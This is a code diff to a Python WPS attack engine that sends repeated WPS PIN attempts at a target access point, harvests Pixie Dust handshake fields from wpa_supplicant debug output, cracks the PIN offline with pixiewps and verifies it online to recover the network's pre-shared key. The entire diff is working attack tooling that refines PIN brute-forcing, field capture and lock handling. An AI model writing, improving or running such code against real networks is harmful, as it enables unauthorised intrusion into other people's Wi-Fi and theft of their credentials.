@@ -8,7 +8,7 @@ WPS Engine v3 - Direct wpa_supplicant controller
 - Lock status detection (M2D, NACK)
 """
 
-import os, re, time, socket, tempfile, subprocess, shutil
+import os, re, time, socket, tempfile, subprocess, shutil, select, fcntl, threading, queue
 
 
 class WpsEngine:
@@ -43,6 +43,9 @@ class WpsEngine:
 
         self.output_lines = []
         self.callback = None
+        self._line_queue = queue.Queue()
+        self._reader_thread = None
+        self._reader_stop = threading.Event()
 
     # ═══════════════════════════════════════════
     # PROCESS MANAGEMENT
@@ -89,6 +92,16 @@ class WpsEngine:
         else:
             return False, 'Control interface timeout'
 
+        # Background reader: never block the WPS timeout loop on stdout.readline()
+        self._reader_stop.clear()
+        self._line_queue = queue.Queue()
+        self._reader_thread = threading.Thread(
+            target=self._stdout_reader_loop,
+            name='wps-engine-stdout',
+            daemon=True,
+        )
+        self._reader_thread.start()
+
         # Create Unix socket
         self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
         self.sock_file = tempfile.mktemp(dir=self.temp_dir)
@@ -99,6 +112,10 @@ class WpsEngine:
 
     def stop(self):
         """Stop wpa_supplicant and cleanup"""
+        try:
+            self._reader_stop.set()
+        except Exception:
+            pass
         try:
             if self.sock:
                 self.sock.close()
@@ -161,19 +178,60 @@ class WpsEngine:
     # OUTPUT PARSING
     # ═══════════════════════════════════════════
 
-    def _read_line(self):
-        """Read one line from wpa_supplicant output"""
-        if self.wpas_process and self.wpas_process.stdout:
-            line = self.wpas_process.stdout.readline()
-            if line:
-                return line.rstrip('\n')
-        return ''
+    def _stdout_reader_loop(self):
+        """Continuously read wpa_supplicant stdout into a queue."""
+        stream = None
+        try:
+            if self.wpas_process:
+                stream = self.wpas_process.stdout
+        except Exception:
+            stream = None
+        if not stream:
+            return
+        while not self._reader_stop.is_set():
+            try:
+                line = stream.readline()
+            except Exception:
+                break
+            if line == '' or line is None:
+                # EOF or transient empty
+                if self.wpas_process and self.wpas_process.poll() is not None:
+                    break
+                time.sleep(0.05)
+                continue
+            try:
+                self._line_queue.put(line.rstrip('\n'))
+            except Exception:
+                break
+
+    def _read_line(self, wait=0.2):
+        """Pop one line from the reader queue (never hangs the attack loop)."""
+        try:
+            return self._line_queue.get(timeout=max(0.01, float(wait)))
+        except queue.Empty:
+            return ''
+        except Exception:
+            return ''
 
     def _get_hex(self, line):
-        """Extract hex data from debug output"""
+        """Extract hex data from wpa_supplicant -K debug lines."""
+        if not line:
+            return ''
+        # Common: "label - hexdump(len=N): aa bb cc"
+        m = re.search(r'hexdump\s*\(len=\d+\):\s*([0-9a-fA-F ]+)', line)
+        if m:
+            return m.group(1).replace(' ', '').upper()
+        # Alternate: "label: aa bb cc" after last colon group
+        m = re.search(r':\s*((?:[0-9a-fA-F]{2}\s*){8,})\s*$', line)
+        if m:
+            return m.group(1).replace(' ', '').upper()
         parts = line.split(':', 3)
         if len(parts) >= 3:
-            return parts[2].replace(' ', '').upper()
+            cand = parts[-1].replace(' ', '').strip()
+            # keep only hex chars
+            cand = re.sub(r'[^0-9A-Fa-f]', '', cand)
+            if len(cand) >= 16:
+                return cand.upper()
         return ''
 
     def _handle_wps_message(self, line):
@@ -214,20 +272,22 @@ class WpsEngine:
             self._log('PIN was rejected by the registrar')
             return False
 
-        if 'enrollee nonce' in ll and 'hexdump' in ll:
-            self._capture_pixie('E_NONCE', line, 32)
-        elif 'registrar nonce' in ll and 'hexdump' in ll:
-            self._capture_pixie('R_NONCE', line, 32)
-        elif 'dh own public key' in ll and 'hexdump' in ll:
-            self._capture_pixie('PKR', line, 384)
-        elif 'dh peer public key' in ll and 'hexdump' in ll:
-            self._capture_pixie('PKE', line, 384)
-        elif 'authkey' in ll and 'hexdump' in ll:
-            self._capture_pixie('AUTHKEY', line, 64)
-        elif 'e-hash1' in ll and 'hexdump' in ll:
-            self._capture_pixie('E_HASH1', line, 64)
-        elif 'e-hash2' in ll and 'hexdump' in ll:
-            self._capture_pixie('E_HASH2', line, 64)
+        # Pixie field capture — match common wpa_supplicant -K labels
+        if 'hexdump' in ll:
+            if 'enrollee nonce' in ll or 'e-nonce' in ll or 'enonce' in ll:
+                self._capture_pixie('E_NONCE', line, 32)
+            elif 'registrar nonce' in ll or 'r-nonce' in ll or 'rnonce' in ll:
+                self._capture_pixie('R_NONCE', line, 32)
+            elif 'dh own public key' in ll or 'own dh public key' in ll:
+                self._capture_pixie('PKR', line, 384)
+            elif 'dh peer public key' in ll or 'peer dh public key' in ll:
+                self._capture_pixie('PKE', line, 384)
+            elif 'authkey' in ll or 'auth key' in ll:
+                self._capture_pixie('AUTHKEY', line, 64)
+            elif 'e-hash1' in ll or 'ehash1' in ll or 'hash1' in ll:
+                self._capture_pixie('E_HASH1', line, 64)
+            elif 'e-hash2' in ll or 'ehash2' in ll or 'hash2' in ll:
+                self._capture_pixie('E_HASH2', line, 64)
 
         if 'network key' in ll and 'hexdump' in ll:
             self.state['status'] = 'GOT_PSK'
@@ -310,21 +370,44 @@ class WpsEngine:
         if not line:
             return True
 
-        # WPS messages
-        if line.startswith('WPS: '):
-            return self._handle_wps_message(line)
+        stripped = line.strip()
+        ll = stripped.lower()
 
-        # Connection states
-        return self._handle_connection_state(line, pbc_mode)
+        # Always try WPS handler for WPS-related lines (with or without "WPS: " prefix)
+        is_wpsish = (
+            stripped.startswith('WPS:')
+            or stripped.startswith('WPS: ')
+            or 'wps' in ll
+            or 'hexdump' in ll
+            or 'wsc_' in ll
+            or 'm2d' in ll
+            or re.search(r'\bM[1-8]\b', stripped) is not None
+            or 'enrollee' in ll
+            or 'registrar' in ll
+            or 'authkey' in ll
+            or 'e-hash' in ll
+            or 'network key' in ll
+        )
+        if is_wpsish:
+            cont = self._handle_wps_message(stripped)
+            if cont is False:
+                return False
+            # still allow connection-state side effects
+        return self._handle_connection_state(stripped, pbc_mode)
 
     # ═══════════════════════════════════════════
     # WPS OPERATIONS
     # ═══════════════════════════════════════════
 
-    def wps_pin_attack(self, bssid, pin, timeout=60):
-        """Perform one WPS PIN attempt and return a normalized result."""
-        for key in self.pixie_data:
-            self.pixie_data[key] = ''
+    def wps_pin_attack(self, bssid, pin, timeout=60, clear_pixie=True):
+        """Perform one WPS PIN attempt and return a normalized result.
+
+        clear_pixie=False keeps previously collected Pixie Dust fields
+        (needed when verifying a pin found by pixiewps).
+        """
+        if clear_pixie:
+            for key in self.pixie_data:
+                self.pixie_data[key] = ''
         self.state = {
             'status': '',
             'last_m': 0,
@@ -335,7 +418,9 @@ class WpsEngine:
             'attempted_pin': pin,
             'verified_pin': None,
         }
-        self.output_lines = []
+        # Keep prior debug lines when verifying after pixiewps; only reset on fresh PIN try
+        if clear_pixie:
+            self.output_lines = []
         self.pixie_data['BSSID'] = bssid.upper()
 
         cmd = 'WPS_REG {bssid} {pin}'.format(bssid=bssid, pin=pin)
@@ -349,14 +434,30 @@ class WpsEngine:
         self._log('Trying PIN: {pin}'.format(pin=pin))
 
         start_time = time.time()
+        last_progress = start_time
         while time.time() - start_time < timeout:
             if not self.is_alive():
                 if not self.state.get('status'):
                     self.state['status'] = 'WPS_FAIL'
+                    self._log('wpa_supplicant exited during WPS exchange')
                 break
-            line = self._read_line()
+            line = self._read_line(wait=0.25)
             if not line:
-                time.sleep(0.05)
+                now = time.time()
+                if now - last_progress >= 5:
+                    elapsed = int(now - start_time)
+                    self._log(
+                        'Waiting for WPS messages... {elapsed}s '
+                        '(last_m={m}, fields={fields})'.format(
+                            elapsed=elapsed,
+                            m=self.state.get('last_m', 0),
+                            fields=sum(
+                                1 for k, v in self.pixie_data.items()
+                                if v and k != 'BSSID'
+                            ),
+                        )
+                    )
+                    last_progress = now
                 continue
             if not self._process_line(line):
                 break
@@ -461,19 +562,40 @@ class WpsEngine:
 
         attempt_records = []
         collected_count = 0
+        required_keys = [
+            'PKE', 'PKR', 'E_NONCE', 'R_NONCE', 'AUTHKEY', 'E_HASH1', 'E_HASH2',
+        ]
+
+        def _count_fields():
+            return sum(
+                1 for key in required_keys if self.pixie_data.get(key)
+            )
+
         for i, pin in enumerate(filtered_pins[:max_attempts]):
-            # Check if we already have enough data
-            if self.pixie_data.get('PKE') and self.pixie_data.get('E_HASH1'):
-                if self.pixie_data.get('AUTHKEY') or self.pixie_data.get('E_HASH2'):
-                    self._log('Enough data collected ({c}/7)'.format(c=collected_count))
-                    break
+            collected_count = _count_fields()
+            # Enough for pixiewps when we have core fields
+            if (
+                self.pixie_data.get('PKE')
+                and self.pixie_data.get('E_HASH1')
+                and self.pixie_data.get('E_HASH2')
+                and self.pixie_data.get('AUTHKEY')
+                and self.pixie_data.get('E_NONCE')
+            ):
+                self._log(
+                    'Enough data collected ({c}/7)'.format(c=collected_count)
+                )
+                break
 
             self._log('Collecting data with PIN: {pin} ({i}/{n})'.format(
-                pin=pin, i=i+1, n=max_attempts))
+                pin=pin, i=i + 1, n=min(max_attempts, len(filtered_pins))
+            ))
 
             old_data = self.pixie_data.copy()
             started = time.time()
-            result = self.wps_pin_attack(bssid, pin, timeout=30)
+            # 45s gives weak-signal APs time to finish M1-M4
+            result = self.wps_pin_attack(
+                bssid, pin, timeout=45, clear_pixie=True
+            )
             elapsed = time.time() - started
             attempt_records.append({
                 'pin': pin,
@@ -482,14 +604,33 @@ class WpsEngine:
                 'duration': elapsed,
             })
 
-            # Merge data (keep old if new didn't get it)
-            for key in self.pixie_data:
-                if not self.pixie_data[key] and old_data[key]:
-                    self.pixie_data[key] = old_data[key]
+            # Merge: never lose previously collected pixie fields
+            for key in required_keys + ['BSSID']:
+                new_val = self.pixie_data.get(key) or ''
+                old_val = old_data.get(key) or ''
+                if not new_val and old_val:
+                    self.pixie_data[key] = old_val
 
-            if self.state['status'] == 'GOT_PSK':
+            collected_count = _count_fields()
+            self._log(
+                'Fields after attempt: {c}/7 ({fields})'.format(
+                    c=collected_count,
+                    fields=', '.join(
+                        k for k in required_keys if self.pixie_data.get(k)
+                    ) or 'none',
+                )
+            )
+
+            if self.state.get('status') == 'GOT_PSK' or result.get('status') == 'success':
+                result = result if isinstance(result, dict) else {}
                 result['attempts'] = list(attempt_records)
+                result['pixie_data'] = self.pixie_data.copy()
                 return result
+
+            # Stop early on hard lock
+            if result.get('status') in ('locked',) or self.state.get('is_locked'):
+                self._log('WPS locked — stopping Pixie collection')
+                break
 
         # Count collected fields
         collected = [k for k, v in self.pixie_data.items() if v and k != 'BSSID']
@@ -520,27 +661,95 @@ class WpsEngine:
                 cmd = [c for c in cmd if c and len(c) > 2]
 
                 try:
-                    r = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
-                    output_lines = r.stdout.split('\n')
-                    for line in output_lines:
+                    # Snapshot pixie fields BEFORE any verify attempt
+                    pixie_snapshot = self.pixie_data.copy()
+                    r = subprocess.run(
+                        cmd, capture_output=True, text=True, timeout=120
+                    )
+                    for line in (r.stdout or '').split('\n'):
                         self._log(line)
+                    for line in (r.stderr or '').split('\n'):
+                        if line.strip():
+                            self._log(line)
+
+                    cracked_pin = None
+                    for line in (r.stdout or '').split('\n'):
                         if 'WPS pin' in line and '[+]' in line:
-                            pin = line.split(':')[-1].strip()
-                            if pin and pin != '<empty>':
-                                self._log('PIXIEWPS PIN: {p}'.format(p=pin))
-                                # Verify the PIN
-                                verify_started = time.time()
-                                verify_result = self.wps_pin_attack(bssid, pin, timeout=45)
-                                verify_elapsed = time.time() - verify_started
-                                attempt_records.append({
-                                    'pin': pin,
-                                    'status': verify_result.get('status', 'unknown'),
-                                    'response': verify_result.get('output', '')[-500:],
-                                    'duration': verify_elapsed,
-                                })
-                                if verify_result.get('status') == 'success':
-                                    verify_result['attempts'] = list(attempt_records)
-                                    return verify_result
+                            candidate = line.split(':')[-1].strip()
+                            if candidate and candidate != '<empty>' and candidate.isdigit():
+                                cracked_pin = candidate
+                                break
+
+                    if cracked_pin:
+                        self._log('PIXIEWPS PIN: {p}'.format(p=cracked_pin))
+                        self._log(
+                            'Verifying PIN online (keeping Pixie snapshot)...'
+                        )
+                        # Restore snapshot in case anything mutated it
+                        self.pixie_data = pixie_snapshot.copy()
+                        verify_started = time.time()
+                        verify_result = self.wps_pin_attack(
+                            bssid,
+                            cracked_pin,
+                            timeout=60,
+                            clear_pixie=False,
+                        )
+                        verify_elapsed = time.time() - verify_started
+                        # Always restore pixie snapshot after verify
+                        self.pixie_data = pixie_snapshot.copy()
+                        attempt_records.append({
+                            'pin': cracked_pin,
+                            'status': verify_result.get('status', 'unknown'),
+                            'response': verify_result.get('output', '')[-500:],
+                            'duration': verify_elapsed,
+                        })
+                        if verify_result.get('status') == 'success':
+                            verify_result['attempts'] = list(attempt_records)
+                            verify_result['pixie_data'] = pixie_snapshot.copy()
+                            verify_result['pixie_pin'] = cracked_pin
+                            return verify_result
+
+                        # PIN found offline but online verify failed
+                        # (weak signal / lock / timeout) — still return it
+                        self._log(
+                            'PIN {p} found by pixiewps but online verify '
+                            'did not return PSK (status={st}). '
+                            'Retry PIN attack when signal is stronger.'.format(
+                                p=cracked_pin,
+                                st=verify_result.get('status'),
+                            )
+                        )
+                        return {
+                            'pin': cracked_pin,
+                            'attempted_pin': cracked_pin,
+                            'psk': None,
+                            'status': 'pixie_pin_unverified',
+                            'pixie_data': pixie_snapshot.copy(),
+                            'collected_count': collected_count,
+                            'output': '\n'.join(self.output_lines),
+                            'attempts': attempt_records,
+                            'pixie_pin': cracked_pin,
+                            'verify_status': verify_result.get('status'),
+                        }
+
+                    combined = (r.stdout or '') + '\n' + (r.stderr or '')
+                    if (
+                        collected_count >= 7
+                        and (
+                            'WPS pin not found' in combined
+                            or '[-] WPS pin not found' in combined
+                        )
+                    ):
+                        return {
+                            'pin': None,
+                            'attempted_pin': None,
+                            'psk': None,
+                            'status': 'pixie_not_vulnerable',
+                            'pixie_data': self.pixie_data.copy(),
+                            'collected_count': collected_count,
+                            'output': '\n'.join(self.output_lines),
+                            'attempts': attempt_records,
+                        }
                 except Exception as e:
                     self._log('pixiewps error: {e}'.format(e=str(e)))
             else:
